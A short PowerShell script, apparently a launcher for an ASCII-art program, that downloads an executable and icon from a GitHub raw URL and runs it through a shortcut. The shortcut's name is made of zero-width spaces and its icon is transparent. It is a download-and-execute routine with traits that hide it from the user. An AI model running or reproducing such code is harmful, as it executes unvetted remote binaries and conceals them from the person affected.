function IsAdmin { 
  (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) 
}

$base = if (IsAdmin) { "$env:ProgramFiles\art" } else { $env:TEMP }
if (!(Test-Path $base)) { mkdir $base }
$exe = Join-Path $base "app.exe"
$ico = Join-Path $base "transparent.ico"
$exeUrl = "https://raw.githubusercontent.com/bridgerzan/live-ascii/refs/heads/main/app.exe"
$icoUrl = "https://raw.githubusercontent.com/bridgerzan/live-ascii/refs/heads/main/transparent.ico"
if (!(Test-Path $exe) -or ((Get-Item $exe).Length -lt 5MB -or (Get-Item $exe).Length -gt 8MB)) { 
  Invoke-WebRequest $exeUrl -OutFile $exe 
}
if (!(Test-Path $ico)) { 
  Invoke-WebRequest $icoUrl -OutFile $ico 
}
$zwsp = [char]0x200B
$shortcut = Join-Path $base "$zwsp$zwsp.lnk"
$shell = New-Object -ComObject WScript.Shell
$sc = $shell.CreateShortcut($shortcut)
$sc.TargetPath = "$env:windir\System32\cmd.exe"
$sc.Arguments = "/k title && `"$exe`""
$sc.IconLocation = $ico
$sc.Save()
Start-Process $shortcut
